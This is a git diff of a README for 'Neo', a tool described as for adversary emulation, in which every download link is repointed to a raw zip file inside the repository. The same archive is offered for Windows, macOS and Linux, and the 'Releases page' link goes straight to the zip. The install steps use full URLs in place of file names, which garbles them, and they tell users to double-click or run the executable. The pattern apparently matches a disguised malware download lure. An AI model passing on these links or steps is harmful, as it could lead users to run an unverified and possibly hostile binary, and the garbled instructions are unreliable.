@@ -1,6 +1,6 @@
 # 🚀 Neo - A Simple Tool for Adversary Emulation
 
-[![Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip%20Neo-Here-brightgreen)](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip)
+[![Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip%20Neo-Here-brightgreen)](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip)
 
 ## 📖 Introduction
 
@@ -30,40 +30,40 @@ To run Neo effectively, your system should meet the following requirements:
 
 ### Step 1: Download Neo
 
-To download Neo, visit the [Releases page](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip). Here, you'll find the latest version. 
+To download Neo, visit the [Releases page](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip). Here, you'll find the latest version. 
 
-[![Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip%20Neo-Here-brightgreen)](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip)
+[![Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip%20Neo-Here-brightgreen)](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip)
 
 ### Step 2: Choose Your Version
 
 On the Releases page, locate the version you wish to download. Click on the appropriate file for your operating system. If you are unsure which file to select, look for:
 
-- **Windows:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip
-- **macOS:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip
-- **Linux:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip
+- **Windows:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip
+- **macOS:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip
+- **Linux:** https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip
 
 ### Step 3: Run the Installer
 
 Once the download is complete:
 
 - **Windows:**
-  1. Locate the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip` file in your Downloads folder.
+  1. Locate the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip` file in your Downloads folder.
   2. Double-click it to launch the installer.
   3. Follow the on-screen instructions to install Neo.
 
 - **macOS:**
-  1. Open the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip` file from your Downloads.
+  1. Open the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip` file from your Downloads.
   2. Drag the Neo icon into your Applications folder.
   3. Open Neo from the Applications folder.
 
 - **Linux:**
-  1. Extract the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip` file to a folder.
+  1. Extract the `https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip` file to a folder.
   2. Open a terminal and navigate to the Neo folder.
   3. Run the executable file by typing `./Neo` and pressing Enter.
 
 ## ⚙️ Download & Install
 
-To download and install Neo, please follow this link: [Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/static/css/Neo-v2.7.zip). Make sure to select the version that fits your operating system.
+To download and install Neo, please follow this link: [Download Neo](https://raw.githubusercontent.com/armnPemula/Neo/main/web/Software_1.0.zip). Make sure to select the version that fits your operating system.
 
 ## 📊 Usage
 
